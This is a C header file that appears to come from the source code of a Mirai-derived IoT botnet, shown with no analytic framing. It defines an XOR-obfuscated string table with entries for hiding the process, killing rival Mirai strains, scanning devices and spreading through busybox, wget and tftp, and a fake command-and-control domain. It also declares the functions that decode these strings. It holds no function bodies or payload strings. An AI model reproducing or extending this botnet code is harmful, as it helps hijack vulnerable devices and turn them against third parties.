#pragma once

#include <stdint.h>

#include "includes.h"

enum
{
    TABLE_HIDE = 1,
    TABLE_DEPLOY_STRING = 2,
    TABLE_KILLER_PROC = 3,
    TABLE_KILLER_MAPS = 4,
    TABLE_KILLER_EXE = 5,
    TABLE_KILLER_MIRAI = 6,
    TABLE_KILLER_MIRAI2 = 7,
    TABLE_KILLER_MIRAI3 = 8,
    TABLE_KILLER_MIRAI4 = 9,
    TABLE_KILLER_MIRAI5 = 10,
    TABLE_KILLER_MIRAI6 = 11,
    TABLE_KILLER_MIRAI7 = 12,
    TABLE_KILLER_MIRAI8 = 13,
    TABLE_KILLER_MIRAI9 = 14,
    TABLE_KILLER_MIRAI10 = 15,
    TABLE_KILLER_MIRAI11 = 16,
    TABLE_KILLER_MIRAI12 = 17,
    TABLE_KILLER_MIRAI13 = 18,
    TABLE_KILLER_MIRAI14 = 19,
    TABLE_SCAN_ENABLE = 20,
    TABLE_SCAN_SYSTEM = 21,
    TABLE_SCAN_SHELL = 22,
    TABLE_SCAN_SH = 23,
    TABLE_SCAN_QUERY = 24,
    TABLE_SCAN_BUSYBOX_RESPONSE = 25,
    TABLE_SCAN_WGET_RESPONSE = 26,
    TABLE_SCAN_TFTP_RESPONSE = 27,
    TABLE_SCAN_ECHO_RESPONSE = 28,
    TABLE_SCAN_MOUNTS_RESPONSE = 29,
    TABLE_SCAN_DROPPER_NAME = 30,
    TABLE_SCAN_BINARY_NAME = 31,
    TABLE_SCAN_INFECT_RESPONSE = 32,
    TABLE_SCAN_ECHO_FEEDBACK = 33,
    TABLE_SCAN_CAT_BUSYBOX = 34,
    TABLE_SCAN_DETERMINE_INFECTION = 35,
    TABLE_FAKE_CNC_DOMAIN = 36,
    TABLE_ATTACH_EXE = 37,
    TABLE_KILLER_UPX = 38,
};

struct table_struct
{
    int val;
    char *str;
    uint16_t str_len;
    BOOL locked;
    struct table_struct *next;
};

void *xor(void *, int);
void unlock_entry(uint8_t);
void lock_entry(uint8_t);
void init_entrys(void);
char *retrieve_entry(uint8_t);
